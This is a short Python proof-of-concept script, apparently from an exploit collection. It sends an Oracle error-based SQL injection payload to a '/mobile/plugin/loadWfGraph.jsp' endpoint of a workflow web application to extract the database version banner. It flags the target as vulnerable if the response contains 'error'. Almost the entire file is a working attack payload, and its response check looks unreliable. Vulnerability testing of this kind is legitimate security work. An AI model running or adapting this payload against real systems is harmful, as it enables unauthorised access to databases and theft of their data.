__author__ = 'xy'

import requests


def info():
    pass


def exp():
    pass


def poc(base_url):
    url = base_url + "/mobile/plugin/loadWfGraph.jsp?workflowid=1&requestid=1' AND 9945=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(97)||CHR(102)||CHR(108)||CHR(113)||(REPLACE(REPLACE(REPLACE(REPLACE((SELECT NVL(CAST(Banner AS VARCHAR(4000)),CHR(32)) FROM v$version WHERE rownum = 1),CHR(32),CHR(113)||CHR(117)||CHR(113)),CHR(36),CHR(113)||CHR(115)||CHR(113)),CHR(64),CHR(113)||CHR(117)||CHR(113)),CHR(35),CHR(113)||CHR(111)||CHR(113)))||CHR(113)||CHR(97)||CHR(102)||CHR(108)||CHR(113))) FROM DUAL) AND 'jsWv'='jsWv"
    response = requests.get(url, timeout=10, verify=False).content
    if "error" in response:
        return True
    return False
